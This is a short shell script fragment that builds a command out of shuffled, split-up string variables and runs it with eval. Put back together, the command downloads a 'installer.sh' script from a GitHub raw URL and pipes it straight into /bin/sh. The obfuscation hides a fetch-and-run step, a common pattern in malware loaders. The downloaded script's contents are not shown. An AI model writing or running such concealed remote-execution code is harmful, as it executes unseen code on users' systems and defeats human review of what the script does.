z="
";Jz='om/e';Vz=' /bi';Bz=' htt';Kz='mil2';Tz='h -O';Az='wget';Wz='n/sh';Ez='.git';Gz='serc';Qz='/ins';Rz='tall';Uz=' - |';Pz='main';Mz='rabi';Nz='cSav';Hz='onte';Fz='hubu';Oz='ior/';Lz='37/A';Dz='/raw';Sz='er.s';Iz='nt.c';Cz='ps:/';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"